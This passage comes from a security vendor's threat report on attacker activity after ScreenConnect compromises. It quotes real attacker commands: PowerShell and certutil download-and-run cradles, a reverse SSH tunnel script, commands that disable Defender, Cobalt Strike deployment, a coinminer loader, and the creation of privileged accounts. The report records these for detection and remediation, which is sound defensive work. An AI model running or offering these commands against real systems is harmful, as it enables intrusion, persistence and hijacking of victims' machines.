   - Interval: Unknown #760\n  - services.exe (2 of 5)\n    - Interval: 0s #904\n  - ScreenConnect.ClientService.exe (3 of 5)\n    - Interval: 0s #3380\n  - cmd.exe (4 of 5)\n    - Interval: 21h 30m 52s #6588\n  - powershell.exe (5 of 5)\n    - Interval: 0s #14140\n  \n  Process Details\n  ----------------\n  - Parent PID: 6588\n  - PID: 14140\n  - User: NT AUTHORITY\\SYSTEM\n  - User ID: S-1-5-18\n  - Process Name: powershell.exe\n  - Detection Rule: ThreatOps Hunting\n  - Started At: 2024-02-21 19:37:33 UTC\n  - Elevated Access Privileges: False\n  - Executable: C:\\WINDOWS\\SYSTEM32\\WINDOWSPOWERSHELL\\v1.0\\powershell.exe\n  \n  Command Line\n  -------------\n  powershell wget -uri http://185.232.92.32:8888/SentinelUI.exe -OutFile C:\\Windows\\Help\\Help\\SentinelUI.exe; wget -uri http://185.232.92.32:8888/Logs.txt -uri http://185.232.92.32:8888/SentinelAgentCore.dll -OutFile C:\\Windows\\Help\\Help\\SentinelAgentCore.dll; cmd /c C:\\Windows\\Help\\Help\\SentinelAgent.exe;SCHTASKS /Create /TN \\Microsoft\\Windows\\Wininit\\UserCache_170853520863 /TR \\\"C:\\Windows\\Help\\Help\\SentinelUI.exe\\\" /RU SYSTEM /SC ONSTART /RL HIGHEST /NP /F /DELAY 0000:05\n```\n\n*Figure 8: Creation of a coinminer masquerading as SentinelOne*\n\nWe also observed adversaries downloading and using a xmrig cryptominer, with further details below.\n\n---\n\n## Adversaries Installing Additional Remote Access\n\nAdversaries seemed to commonly install additional, “legitimate” remote access tools, likely as an attempt to remain persistent even once the ScreenConnect fiasco has been cleared up.\n\n### Simple Help\n\nAn adversary we observed installed the Simple Help RMM, from their ScreenConnect initial access.\n\nWe observed the Simple Help RMM agent deployed in the following directories:\n\n- **C:\\Users\\oldadmin\\Documents\\Maxx Uptime remote connection\\Files\\agent.exe**\n- **C:\\ProgramData\\JWrapper-Remote Access\\JWAppsSharedConfig\\restricted\\SimpleService.exe**\n- **C:\\Users\\oldadmin\\Documents\\MilsoftConnect\\Files\\ta.exe**\n- **C:\\Windows\\spsrv.exe**\n\nWe also observed a configuration file dropped to **C:\\ProgramData\\JWrapper-Remote Access\\JWAppsSharedConfig\\serviceconfig.xml**, which revealed it was configured to communicate to the public IPv4 **91.92.240[.]71**.\n\nThe user **oldadmin** was observed being used running similar commands across multiple unique victim organizations.\n\n```image\nAlt: Execution of Simple Help RMM Agent\nDescription: The image displays a detection timeline for a process named SimpleService.exe, which is part of the Simple Help RMM installation noted in the context. It includes details such as Parent PID, PID, User, User ID, Process Name, Detection Rule, Start Time, Elevated Access Privileges, Executable path, and Command Line. The highlighted command line shows the exact path where the SimpleService.exe file is located. The context indicates that this process was monitored and flagged due to its association with unauthorized remote access activities.\nTranscription: |\n  Detection Timeline\n  -------------------\n  Monitored wininit.exe (1 of 3)\n  Interval: Unknown #1108\n  \n  Monitored services.exe (2 of 3)\n  Interval: 0s #1184\n  \n  High SimpleService.exe (3 of 3)\n  Interval: 12h 12m 51s #25088\n  \n  Process Details\n  ---------------\n  Parent PID: 1184\n  PID: 25088\n  User: NT AUTHORITY\\SYSTEM\n  User ID: S-1-5-18\n  Process Name: SimpleService.exe\n  Detection Rule: ThreatOps Hunting\n  Started At: 2024-02-21 09:42:19 UTC\n  Elevated Access Privileges: False\n  Executable: C:\\ProgramData\\JWrapper-Remote Access\\JWAppsSharedConfig\\restricted\\SimpleService.exe\n  Command Line: \"C:\\ProgramData\\JWrapper-Remote Access\\JWAppsSharedConfig\\restricted\\SimpleService.exe\"\n  MITRE:\n```\n\n*Figure 9: Execution of Simple Help RMM Agent*\n\n### SSH\n\nThis threat actor leveraged their ScreenConnect access to download and run an SSH backdoor, seemingly to facilitate an RDP connection.\n\n```\n#Script that initiated SSH\n$r = \"C:\\ssh\\\"\n$e = $r + \"ssh.exe\"\n$g = \"aqua.oops.wtf\"\nIf (!(Test-Path $e)) {\n    md $r > $null\n    iwr -Uri ($g + \"/z\") -o ($r + \"z.zip\")\n    Expand-Archive ($r + \"z.zip\") -d $r\n}\n$args = @(\"tunnel@\" + $g,\"-Z lollersk8\",\"-R \" + $p + \":localhost:3389\",\"-p 443\", \"-N\",\"-oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null\")\n(Start-Process -f $e -a $args -PassThru -WindowStyle Hidden).Id\n\n#final command run on a host\nC:\\ssh\\ssh.exe\" tunnel@aqua[.]oops.wtf -Z lollersk8 -R 9595:localhost:3389 -p 443 -N -oStrictHostKeyChecking=no -oUserKnownHostsFile=/dev/null\n```\n\n```image\nAlt: Huntress report for the aforementioned ssh backdoor\nDescription: The image is a screenshot of an incident report indicating a critical security incident. It contains details about the incident, including the severity level, status, and specific actions taken to isolate the affected host. The report mentions that a ScreenConnect instance was exploited to download payloads from a specified domain, leading to the creation of an SSH tunnel. Remediation instructions are also provided, outlining steps to block the malicious domain and ensure necessary security measures are applied.\nTranscription: |\n  Incident Report: CRITICAL - ISOLATED - Incident on\n  Severity: Critical\n  Status: Resolved\n  Organization:\n  Entity: (host)\n  \n  Report\n  *** The Huntress Agent has been tasked to isolate this host from the rest of the network in order to prevent the incident from spreading to other hosts. ***\n  \n  Evidence suggests the screen connect instance \"support.\" was exploited and used to download further payloads from \"aqua[.]oops[.]wtf\", allowing the attacker to create an SSH tunnel for additional access.\n  \n  Host:\n  Organization:\n  Tags: None\n  Security Products:\n  \n  Incident Report:\n  Severity: Critical\n  \n  Remediation Instructions\n  -------------------------\n  - Block \"aqua.oops[.]wtf\"\n  - Ensure Huntress is deployed to all endpoints with the instance \"support\" so we can monitor for further compromise\n  - Ensure the Screen connect instance gets the required patches applied\n```\n\n*Figure 10: Huntress report for the aforementioned ssh backdoor*\n\n### Google Chrome Remote Desktop\n\nWe also observed an adversary do something quite interesting with Google Chrome’s Remote Desktop. They pulled the installer directly from Google infrastructure, which stores it as a service—no doubt in the hopes they could persistently and remotely access the environment via a second GUI remote access tool (we enjoy crushing hacker hopes here at Huntress).\n\n```\n# Download from Google\npowershell  -c (New-Object System.Net.WebClient).DownloadFile('https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi', $env:ProgramData+'\\\\1.msi')\n\n# Install\nmsiexec /i C:\\\\ProgramData\\\\1.msi\n```\n\n```image\nAlt: Attempted download of Google Chrome’s Remote Desktop client\nDescription: The image displays a detection timeline of processes related to a cybersecurity incident. It includes monitored processes such as 'wininit.exe', 'services.exe', 'ScreenConnect.ClientService.exe', 'cmd.exe', and a highlighted 'powershell.exe' process. The bottom section provides detailed information about the 'powershell.exe' process, including its parent process ID, process ID, user ID, detection rule, start time, access privileges, executable path, and the command line used for the attempted download of Google Chrome Remote Desktop. This information is crucial for understanding the sequence of events during the detected threat.\nTranscription: |\n  Detection Timeline\n  -------------------\n  - wininit.exe (1 of 5)\n    - Monitored\n    - Interval: Unknown #568\n  \n  - services.exe (2 of 5)\n    - Monitored\n    - Interval: 0s #684\n  \n  - ScreenConnect.ClientService.exe (3 of 5)\n    - Monitored\n    - Interval: 0s #2252\n  \n  - cmd.exe (4 of 5)\n    - Monitored\n    - Interval: 12h 54m 9s #1072\n  \n  - powershell.exe (5 of 5)\n    - High\n    - Interval: 0s #5848\n  \n  Process Details\n  ---------------\n  - Parent PID: 1072\n  - PID: 5848\n  - User: NT AUTHORITY\\SYSTEM\n  - User ID: S-1-5-18\n  - Process Name: powershell.exe\n  - Detection Rule: ThreatOps Hunting\n  - Started At: 2024-02-23 13:19:25 UTC\n  - Elevated Access Privileges: False\n  - Executable: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  - Command Line: powershell -c (New-Object System.Net.WebClient).DownloadFile('https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msi', $env:ProgramData + '\\\\1.msi')\n```\n\n*Figure 11: Attempted download of Google Chrome’s Remote Desktop client*\n\n```image\nAlt: Figure 12: Huntress platform detecting the persistent installation of Google Chrome’s Remote Desktop client\nDescription: The image depicts a detailed table containing information regarding a detected malware event related to the Chrome Remote Desktop service. It includes a variety of fields such as the 'File Path', 'Name', 'Path', 'State', 'Status', and 'Command' that show the command executed, which points to a specific executable related to the Chrome Remote Desktop. Other details include the creation time, classification as 'Malicious', and category labeled as 'Malware / Backdoor'. This structured data is critical for understanding the specifics of the malware detection and its implications.\nTranscription: |\n  Detector: Service (Own Process)\n  Type: Chrome Remote Desktop Service\n  Command: \"C:\\Program Files (x86)\\Google\\Chrome Remote Desktop\\122.0.6261.0\\remoting_host.exe\" --type=daemon --host-config=\"C:\\ProgramData\\Google\\Chrome Remote Desktop\\host.json\"\n  Date Added: 2024-02-23 13:25:54 UTC\n  Present: ✔\n  Category: Malware / Backdoor\n  Reported: Reported\n  Signals: Reported 12359129\n  Details\n  \n  Host Autorun ID: 23791700749\n  Created: about 2 hours\n  Classification: Malicious\n  Classification Source: Investigation\n  Classification Date: 2024-02-23 13:55:25 UTC\n  Category: Malware / Backdoor\n  From Survey: 02/23/2024 - 13:25\n  \n  Foothold Details\n  File Path: c:\\program files (x86)\\google\\chrome remote desktop\\122.0.6261.0\\remoting_host.exe\n  Name: chromoting\n  Path: c:\\program files (x86)\\google\\chrome remote desktop\\122.0.6261.0\\remoting_host.exe\n  State: STOPPED\n  Status: OK\n  Command: \"C:\\Program Files (x86)\\Google\\Chrome Remote Desktop\\122.0.6261.0\\remoting_host.exe\" --type=daemon --host-config=\"C:\\ProgramData\\Google\\Chrome Remote Desktop\\host.json\"\n  Start Name: LocalSystem\n  Display Name: Chrome Remote Desktop Service\n```\n\n---\n\n## Downloading Tools and Payloads\n\nA common tradecraft denominator between the adversaries we observed involved them downloading further tools and payloads.\n\nFor example, an adversary leveraged PowerShell’s **Invoke-WebRequest** (**iwr**) to call on additional payloads for their SSH persistent tunnel.\n\n```\npowershell.exe  -c \"$p = 9595; iwr -UseBasicParsing aqua[.]oops[.]wtf/d | iex\n```\n\n```image\nAlt: Attempted PowerShell cradle download invocation to grab additional post-exploitation tools for SSH tunneling\nDescription: The image displays a detection timeline related to a PowerShell command execution. It shows several monitored processes, including 'wininit.exe', 'services.exe', 'ScreenConnect.ClientService.exe', 'cmd.exe', and a highlighted 'powershell.exe' process. The details include the parent process ID, the process ID, user details, and the command line executed, which is a PowerShell command that uses 'Invoke-WebRequest' to download a file from a specified URL. This timeline is indicative of a potential security incident, capturing the sequence of events leading to the execution of a suspicious command.\nTranscription: |\n  Detection Timeline\n  - wininit.exe (1 of 5)\n    - Monitored\n    - Interval: Unknown #712\n  - services.exe (2 of 5)\n    - Monitored\n    - Interval: 0s #832\n  - ScreenConnect.ClientService.exe (3 of 5)\n    - Monitored\n    - Interval: 0s #98776\n  - cmd.exe (4 of 5)\n    - Monitored\n    - Interval: 19h 39m 22s #89276\n  - powershell.exe (5 of 5)\n    - High\n    - Interval: 0s #84916\n  \n  Process Details\n  - Parent PID: 89276\n  - PID: 84916\n  - User: NT AUTHORITY\\SYSTEM\n  - User ID: S-1-5-18\n  - Process Name: powershell.exe\n  - Detection Rule: ThreatOps Hunting\n  - Started At: 2024-02-22 07:39:50 UTC\n  - Elevated Access Privileges: False\n  - Executable: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  - Command Line: powershell.exe -c \\\"$p = 9595; iwr -UseBasicParsing aqua.oops.wtf/d | iex\\\"\n```\n\n*Figure 13: Attempted PowerShell cradle download invocation to grab additional post-exploitation tools for SSH tunneling*\n\nWe also observed an adversary download the SimpleHelp RMM via curl and rename the executables to .png’s in an attempt to evade detection (spoiler: they did not evade detection).\n\n```\ncurl  https[:]//cmctt.]com/pub/media/wysiwyg/sun.png\ncurl https[:]//cmctt[.]com/pub/media/wysiwyg/invoke.png\n```\n\n```image\nAlt: SimpleHelp RMM renamed to sun.png, accessed via curl download\nDescription: The image showcases a detection timeline related to a cybersecurity incident. It features a series of monitored processes, with a particular focus on 'curl.exe'. Each process is represented with a timeline indicating the intervals at which they were monitored. Details for 'curl.exe' are highlighted, showing its parent process ID, user ID, and command line used for execution, specifically the command to download a file from a URL. The 'curl.exe' entry is marked as 'High', indicating a significant detection. This image effectively conveys specific technical details related to the monitored processes and their relevance to potential threat activities.\nTranscription: |\n  Detection Timeline\n  \n  - Monitored wininit.exe (1 of 5)\n    - Interval: Unknown #1108\n  - Monitored services.exe (2 of 5)\n    - Interval: 0s #1184\n  - Monitored ScreenConnect.ClientService.exe (3 of 5)\n    - Interval: 0s #5108\n  - Monitored cmd.exe (4 of 5)\n    - Interval: 11h 57m 42s #20572\n  - High curl.exe (5 of 5)\n    - Interval: 0s #9520\n  \n  Process Details\n  - Parent PID: 20572\n  - PID: 9520\n  - User: NT AUTHORITY\\SYSTEM\n  - User ID: S-1-5-18\n  - Process Name: curl.exe\n  - Detection Rule: ThreatOps Hunting\n  - Started At: 2024-02-21 09:27:09 UTC\n  - Elevated Access Privileges: False\n  - Executable: C:\\Windows\\System32\\curl.exe\n  - Command Line: curl https://cmctt.com/pub/media/wysiwyg/sun.png\n```\n\n*Figure 14: SimpleHelp RMM renamed to sun.png, accessed via curl download*\n\nThere was also this straightforward PowerShell downloading activity. However, the file was deleted, and their infrastructure was offline, meaning the file’s intent had not been determined.\n\n```\npowershell.exe -command \"& Invoke-RestMethod -Uri \\\"http[:]//91.92.241.199:8080/servicetest2.dll\\\" -OutFile servicehost.dll\n```\n\n### Download Evasion\n\nWe also observed adversaries leverage LOLBINs like certutil to download their payloads, likely in an attempt to fly under the radar.\n\n```\ncertutil  -urlcache -f http[:]//23.26.137[.]225:8084/msappdata.msi c:\\mpyutd.msi\n```\n\nSome adversaries maliciously modified the AV on the host before downloading their payloads. In this specific example, svchost.exe was deleted before analysis could be conducted. \n\n```\n#adversary excluded directories and neutralised Defender\npowershell -ep bypass -c \\\"Set-MpPreference -DisableRealtimeMonitoring $true;\n\nSet-MpPreference -ExclusionPath C:\\\\Windows\\\\Temp;\n\n#then downloaded their file \nInvoke-WebRequest http://159[.]65[.]130[.]146:4444/svchost.exe -OutFile C:\\\\Windows\\\\Temp\\\\svchost.exe;\n\nC:\\\\Windows\\\\Temp\\\\svchost.exe\n```\n\n```image\nAlt: Figure 15: Evidence of a malicious payload download with defense evasion attempt\nDescription: The image displays a detection timeline of monitored processes, with a particular focus on 'ScreenConnect.ClientService.exe' and 'powershell.exe'. It includes details such as the parent PID, process ID, user information, and the command line executed for the PowerShell process. The command line indicates an attempt to bypass Windows Defender settings and download a file from a remote server, which is evidential of a malicious payload download. This image provides valuable insights into the specific activities of a threat actor.\nTranscription: |\n  Detection Timeline\n  \n  Monitored winit.exe (1 of 5)\n  Interval: Unknown #572\n  \n  Monitored services.exe (2 of 5)\n  Interval: 0s #832\n  \n  Monitored ScreenConnect.ClientService.exe (3 of 5)\n  Interval: 0s #6412\n  \n  Monitored cmd.exe (4 of 5)\n  Interval: 1d 10h 8m 51s #12816\n  \n  High powershell.exe (5 of 5)\n  Interval: 0s #17360\n  \n  Process Details\n  Parent PID: 12816\n  PID: 17360\n  User: NT AUTHORITY\\SYSTEM\n  User ID: S-1-5-18\n  Process Name: powershell.exe\n  Detection Rule: Suspicious Defender Exclusions\n  Started At: 2024-02-22 07:18:50 UTC\n  Elevated Access Privileges: False\n  Executable: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  \n  Command Line:\n  powershell -ep bypass -c \\\"Set-MpPreference -DisableRealtimeMonitoring $true;Set-MpPreference -ExclusionPath C:\\Windows\\1Temp;Invoke-WebRequest http://159.65.130.146:4444/svchost.exe -OutFile C:\\Windows\\1Temp\\\\svchost.exe;C:\\Windows\\1Temp\\\\svchost.exe\\\"\n```\n\nAdversaries also used their ScreenConnect sessions to reach out and download Cobalt Strike beacons from their external infrastructure. Specifically, this threat actor saved their beacon as a `.PDF` on a web server, renaming it to a `.DAT` on the targeted machine.\n\n```\ncurl hxxp[://]minish[.]wiki[.]gd/c[.]pdf -o c:\\\\programdata\\\\update[.]dat\n```\n\n```image\nAlt: Figure 16: Evidence of Cobalt Strike payload download\nDescription: The image depicts a detection timeline of various processes on a Windows system, highlighting the execution of 'curl.exe' as a significant event in this context. It shows the sequence of monitored processes such as 'wininit.exe', 'services.exe', 'ScreenConnect.ClientService.exe', and 'cmd.exe'. The 'curl.exe' process is marked with a high alert, detailing its parent PID, PID, user permissions, execution path, and the specific command line used to download a file from an external URL. This information is relevant to understanding the behavior of potential threats and the methods used for downloading malicious payloads.\nTranscription: |\n  plaintext\n  Detection Timeline\n  \n  Monitored winit.exe (1 of 5)\n  Interval: Unknown #924\n  \n  Monitored services.exe (2 of 5)\n  Interval: 0s #996\n  \n  Monitored ScreenConnect.ClientService.exe (3 of 5)\n  Interval: 0s #4400\n  \n  Monitored cmd.exe (4 of 5)\n  Interval: 1d 9h 48m 54s #13360\n  \n  High curl.exe (5 of 5)\n  Interval: 1s #21192\n  \n  Process Details\n  Parent PID: 13360\n  PID: 21192\n  User: NT AUTHORITY\\SYSTEM\n  User ID: S-1-5-18\n  Process Name: curl.exe\n  Detection Rule: ThreatOps Hunting\n  Started At: 2024-02-22 20:37:52 UTC\n  Elevated Access Privileges: False\n  Executable: C:\\Windows\\System32\\curl.exe\n  Command Line: curl http://minish.wiki.gd/c.pdf -o c:\\programdata\\update.dat\n```\n\n### Transfer.sh\n\nInterestingly, we observed an adversary mass download cryptocurrency miners using the temporary file upload website `transfer.sh`.\n\n```\npowershell  -command \\\"iex ((New-Object System[.]Net[.]WebClient).DownloadString('hxxps[://]transfer[.]sh/gUHRYTNxj8/injcet2[.]ps1'))\\\"\n```\n\nExcerpt of the script (full script in the Appendix): \n\n```\n$listi = 'hxxps[://]transfer[.]sh/UFQTwgYszH/config14[.]json',\n\\'hxxps[://]transfer[.]sh/ATVMNG5Pbu/config13[.]json',\n\\'hxxps[://]transfer[.]sh/s27p8BcTxi/config12[.]json',\n\\'hxxps[://]transfer[.]sh/ojw6aKoA4A/config11[.]json',\n\\'hxxps[://]transfer[.]sh/lyEkHLGt03/config10[.]json',\n\\'hxxps[://]transfer[.]sh/8l4d5qR39o/config9[.]json',\n\\'hxxps[://]transfer[.]sh/xkIMWnocQH/config8[.]json',\n\\'hxxps[://]transfer[.]sh/Db5eUfqKP9/config7[.]json',\n\\'hxxps[://]transfer[.]sh/L1e30KShXP/config6[.]json',\n\\'hxxps[://]transfer[.]sh/w2Y0iuEKiY/config5[.]json',\n\\'hxxps[://]transfer[.]sh/6bkwRh4NXd/config4[.]json',\n\\'hxxps[://]transfer[.]sh/PRBRzMMEKC/config3[.]json',\n\\'hxxps[://]transfer[.]sh/RWSn6NLIr7/config2[.]json',\n\\'hxxps[://]transfer[.]sh/MRFibhy8fS/config1[.]json',\n\\'hxxps[://]transfer[.]sh/FeDRSFU5XV/config[.]json'\n$randconf = Get-Random -InputObject $listi\nInvoke-WebRequest -Uri $randconf -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'config[.]json'\nInvoke-WebRequest -Uri 'hxxps[://]transfer[.]sh/ePlTBkDtz2/rundll32[.]exe' -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'xmrig[.]exe'\nInvoke-WebRequest -Uri 'hxxps[://]transfer[.]sh/CrNx3LVEgY/nssm[.]exe' -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'nssm[.]exe'\n```\n\n```image\nAlt: Figure 17: PowerShell invocation of malicious script downloaded from Transfer.sh\nDescription: The image depicts a detection timeline related to a cybersecurity incident involving a PowerShell command. It shows various processes being monitored, including 'winit.exe', 'services.exe', 'ScreenConnect.ClientService.exe', 'cmd.exe', and a critical alert for 'powershell.exe'. The timeline illustrates the intervals of monitoring and details like parent process ID, user, and command line executed. The command line highlights the suspicious download from 'transfer.sh', indicating a potential malicious activity.\nTranscription: |\n  Detection Timeline\n  \n  Monitored  wininit.exe (1 of 5)\n  Interval: Unknown #792\n  \n  Monitored  services.exe (2 of 5)\n  Interval: 0s #1004\n  \n  Monitored  ScreenConnect.ClientService.exe (3 of 5)\n  Interval: 0s #3932\n  \n  Monitored  cmd.exe (4 of 5)\n  Interval: 9h 41m 38s #25628\n  \n  Critical  powershell.exe (5 of 5)\n  Interval: 0s #28048\n  \n  Process Details\n  \n  Parent PID: 25628\n  PID: 28048\n  User: NT AUTHORITY\\SYSTEM\n  User ID: S-1-5-18\n  Process Name: powershell.exe\n  Detection Rule: Suspicious Download Via Transfer.sh\n  Started At: 2024-02-21 23:54:35 UTC\n  Elevated Access Privileges: False\n  Executable: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  Command Line: powershell -command \"iex ((New-Object System.Net.WebClient).DownloadString('https://transfer.sh/gUHRYTNxj8/injcet2.ps1'))\\\"\n```\n\n## Adversaries Dropping Cobalt Strike\n\nUnsurprisingly, many adversaries attempted to drop and run a Cobalt Strike beacon on the host.\n\n```\n# Downloaded from hxxp[://]minish[.]wiki[.]gd/c[.]pdf\n\n#Exclude directory in Defender\npowershell.exe  Add-MpPreference -ExclusionPath C:\\\\programdata -Force\n\n#Deploy beacon\nrundll32.exe  c:\\\\programdata\\\\update.dat UpdateSystem\n```\n\n```image\nAlt: Setting exclude directory in Windows Defender for the Cobalt Strike beacon\nDescription: The image depicts a detection timeline of various processes running on a Windows system, highlighting their statuses (monitored or critical). It specifically emphasizes the 'ScreenConnect.ClientService.exe' as being monitored, while the 'powershell.exe' process is marked as critical. Below the critical process details, information such as the Parent PID, PID, User, and Command Line invoking the suspicious activity is provided, showing the command used to exclude a directory in Windows Defender. This information is relevant to cybersecurity analysis, specifically in identifying potential threats related to Cobalt Strike.\nTranscription: |\n  Detection Timeline\n  - wininit.exe (1 of 5)\n    - Monitored\n    - Interval: Unknown #924\n  - services.exe (2 of 5)\n    - Monitored\n    - Interval: 0s #996\n  - ScreenConnect.ClientService.exe (3 of 5)\n    - Monitored\n    - Interval: 0s #4400\n  - cmd.exe (4 of 5)\n    - Monitored\n    - Interval: 1d 9h 48m 54s #13360\n  - powershell.exe (5 of 5)\n    - Critical\n    - Process Details\n      - Parent PID: 13360\n      - PID: 16112\n      - User: NT AUTHORITY\\SYSTEM\n      - User ID: S-1-5-18\n      - Process Name: powershell.exe\n      - Detection Rule: Suspicious Defender Exclusion Paths\n      - Started At: 2024-02-22 20:37:50 UTC\n      - Elevated Access Privileges: False\n      - Executable: C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n      - Command Line: powershell.exe Add-MpPreference -ExclusionPath C:\\programdata -Force\n```\n\n*Figure 18: Setting exclude directory in Windows Defender for the Cobalt Strike beacon*\n\n```image\nAlt: Figure 19: Execution of Cobalt Strike\nDescription: The image presents detailed process information related to a critical execution of 'rundll32.exe', indicating its role as a Cobalt Strike beacon in the ProgramData directory. Key details include the Parent Process ID (5852), Process ID (10244), User (NT AUTHORITY\\SYSTEM), and the command line used to invoke the process: 'rundll32.exe c:\\programdata\\update.dat UpdateSystem'. The detection rule identifies this process as associated with Cobalt Strike, highlighting the security threat it poses.\nTranscription: |\n  plaintext\n  Critical rundll32.exe (4 of 4)\n  \n  Process Details\n  \n  Parent PID              5852\n  PID                     10244\n  User                    NT AUTHORITY\\SYSTEM\n  User ID                 S-1-5-18\n  Process Name            rundll32.exe\n  Detection Rule          Cobalt Strike Beacon in ProgramData\n  Started At              2024-02-22 20:37:53 UTC\n  Elevated Access Privileges  False\n  Executable              C:\\Windows\\System32\\rundll32.exe\n  Command Line            rundll32.exe c:\\\\programdata\\\\update.dat UpdateSystem\n```\n\nIt’s also worth noting that Defender thwarted many of these attempts, as seen in Figure 20.\n\n```image\nAlt: Evidence of Windows Defender neutralizing the Cobalt Strike beacon originating from the ScreenConnect session\nDescription: The image is a data table displaying information about a detected Trojan malware named 'CobaltStrike'. It includes details such as the category (Trojan), threat type (Known Bad), detection timestamps, severity (Severe), threat action (No Action), and threat status (Quarantine Restored). Additionally, it lists the OS resources involved, including a file path, the domain user (Administrator), and the process name associated with the threat.\nTranscription: |\n  Trojan:Win64/CobaltStrike.F!MTB\n  \n  Key                     Value\n  Category                Trojan\n  Threat Type            Known Bad\n  Detected At            2024-02-22 13:59:37 UTC\n  Remediated At          2024-02-22 13:59:58 UTC\n  Created At             2024-02-22 14:09:06 UTC\n  Severity               Severe\n  Threat Action          No Action\n  Threat Status          Quarantine Restored\n  Detection Source       Real Time\n  Execution Status       Blocked\n  OS Resources           [\"file:_C:\\\\Users\\\\Administrator\\\\Documents\\\\Files\\\\Copy.exe\"]\n  Domain User            administrator\n  Process Name           C:\\Program Files (x86)\\ScreenConnect Client (x)\\ScreenConnect.WindowsClient.exe\n  Additional Actions     None\n```\n\n*Figure 20: Evidence of Windows Defender neutralizing the Cobalt Strike beacon originating from the ScreenConnect session*\n\nIt was also common to see the same adversaries drop the (earlier mentioned SentinelUI) cryptocurrency miner **and** attempt a Cobalt Strike beacon, which Windows Defender would neutralize. \n\n```image\nAlt: Figure 21: Evidence of cryptominers and Cobalt Strike being neutralized by Defender\nDescription: The image is a data table that provides details on detected threats related to Cobalt Strike activity on a Windows system. It includes columns for priority, creation timestamp, type, signal name, and specific details about each detection. There are three entries, with two marked as 'Critical' related to the 'MavCobaltStrike' threat, indicating significant concern. The entries detail the processes involved (e.g., 'dllhost.exe'), the persistence mechanism, and the binary path related to the threat. The first entry is marked 'High' and pertains to a different threat involving 'UserCache'.\nTranscription: |\n  plaintext\n  Priority: High\n  Created At: 2024-02-22 00:16:14 UTC\n  Type: FilePathWindowsHelp\n  Signal Name: Name: UserCache_1708535250863\n  Details: \n  Persistence Mechanism: Scheduled Task - UserCache_1708535250863\n  Binary Path: C:\\Windows\\Help\\Help\\SentinelUI.exe\n  \n  Priority: Critical\n  Created At: 2024-02-22 03:12:13 UTC\n  Type: MavCobaltStrike\n  Signal Name: Threat Name: Behavior:Win32/CobaltStrike.Elsms\n  Details:\n  OS Resources: [\"behavior:_process: C:\\\\Windows\\\\System32\\\\dllhost.exe, pid:8056:111820579542652\", \"process:_pid:4076,ProcessStart:133530439396890945\", \"process:...\"]\n  Process Name: C:\\Windows\\System32\\dllhost.exe\n  \n  Priority: Critical\n  Created At: 2024-02-23 00:12:00 UTC\n  Type: MavCobaltStrike\n  Signal Name: Threat Name: Behavior:Win32/CobaltStrike.Elsms\n  Details:\n  OS Resources: [\"behavior:_process: C:\\\\Windows\\\\System32\\\\dllhost.exe, pid:11208:111820579542652\", \"process:_pid:11208,ProcessStart:133530799218133829\", \"process:...\"]\n  Process Name: C:\\Windows\\System32\\dllhost.exe\n```\n\n---\n\n## Adversaries Persisting\n\nAdversaries, of course, want to persist in an environment, beyond their initial access method—and for good reason. This ScreenConnect vulnerability had rapid mitigations suggested by Huntress and ConnectWise that would have undermined the adversary’s access.\n\n### Creating New Users\n\nOur SOC observed a number of adversaries prioritize creating their own users, once they landed on a machine, using naming conventions that would attempt to fly under the radar, as well as add these to highly privileged groups.\n\n```\nnet user /add default test@2021! /domain\nnet group \\\"Domain Admins\\\" default /add /domain\nnet group \\\"Enterprise Admins\\\" default /add /domain\nnet group \\\"Remote Desktop Users\\\" default /add /domain\nnet group \\\"Group Policy Creator Owners\\\" default /add /domain\nnet group \\\"Schema Admins\\\" default /add /domain\nnet user default /active:yes /domain\n\nnet user /add default1 test@2021! /domain\nnet user /add default1 test@2021! /domain\n\n\nnet user /add oldadmin Pass8080!!\nnet localgroup administrators oldadmin /add\n\n\nnet user temp 123123qwE /add /domain\nnet group \\\"Domain Admins\\\" temp /add /domain\n```\n\n```image\nAlt: Evidence of adding a new user\nDescription: The image depicts a detection timeline showing various monitored processes on a system. It highlights the 'net.exe' process, which is indicated as having 'high' relevance. Below it, detailed process information is provided, including the parent process ID, user, and command line used to add a new user with elevated privileges. This supports the context of adversaries creating new users on compromised systems.\nTranscription: |\n  Detection Timeline\n  - wininit.exe (1 of 5)\n    - Interval: Unknown #536\n  - services.exe (2 of 5)\n    - Interval: 0s #652\n  - ScreenConnect.ClientService.exe (3 of 5)\n    - Interval: 0s #2840\n  - cmd.exe (4 of 5)\n    - Interval: 16h 40m 24s #7072\n  - net.exe (5 of 5)\n    - Interval: 0s #2416\n  \n  Process Details\n  - Parent PID: 7072\n  - PID: 2416\n  - User: NT AUTHORITY\\SYSTEM\n  - User ID: S-1-5-18\n  - Process Name: net.exe\n  - Detection Rule: ThreatOps Hunting\n  - Started At: 2024-02-21 13:20:44 UTC\n  - Elevated Access Privileges: False\n  - Executable: C:\\Windows\\system32\\net.exe\n  - Command Line: net user oladmin \"Pass8080!!\" /add\n  - MITRE:\n```\n\n*Figure 22: Evidence of adding a new user*\n\n### Persistent Reverse Shell\n\nThe SOC also observed an adversary transfer a **C:\\perflogs\\RunSchedulerTaskOnce.ps1** from the ScreenConnect compromised, as confirmed from analysis of Windows Event Log’s **Application.evtx** - **Event ID 0**.\n\n```\n# Excerpt from Application.evtx EventID 0\n  EventData:\n    Data:\n      - \"Transferred files with action 'Transfer':\\r\\nRunSchedulerTask.ps1\\r\\nRunSchedulerTaskOnce.ps1\\r\\n\\r\\nVersion: 22.10.11109.8417\\r\\nExecutable Path: C:\\\\Program Files (x86)\\\\ScreenConnect Client (9dd8b1107d6a42d9)\\\\ScreenConnect.ClientService.exe\\r\\n\"\n    Channel: Application\n    EventID: 0\n    EventID_attributes:\n      SystemTime: \"2024-02-23T04:06:06Z\"\n```\n\n```image\nAlt: PowerShell execution of malicious script PowerShell script that included an encoded a Driver.dll\nDescription: The image depicts a detailed log of a PowerShell process execution, showing various attributes related to the process. Key elements include the Parent PID, PID, User ID, Process Name, Detection Rule, Start Time, Elevated Access Privileges, 